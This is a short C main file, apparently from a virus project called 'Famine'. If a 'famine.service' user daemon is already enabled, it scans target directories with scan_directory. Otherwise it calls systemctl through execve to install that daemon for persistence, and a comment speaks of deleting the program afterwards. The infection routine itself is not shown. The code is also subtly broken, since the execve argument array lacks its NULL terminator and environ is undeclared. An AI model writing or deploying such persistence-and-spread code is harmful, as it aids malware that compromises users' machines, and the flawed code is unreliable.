#include "famine.h"

#include <stddef.h> // size_t, NULL

int main(void) {

    const char* paths[] = {// "/tmp/test",
                           // "/tmp/test2",
                           "./tests", NULL};

    // check for the daemon
    if (service_is_enabled("famine.service")) {
        // execute famine
        for (size_t i = 0; paths[i]; i++)
            scan_directory(paths[i]);
        return (0);
    }

    // install daemon
    const char* cmd = "/usr/bin/systemctl";
    char* cmd_args[] = {"systemctl", "--quiet", "--user", "enable", "/daemon/famine.service"};
    execve(cmd, cmd_args, environ);

    // delete famine (execve returns on failure)

    return (1);
}
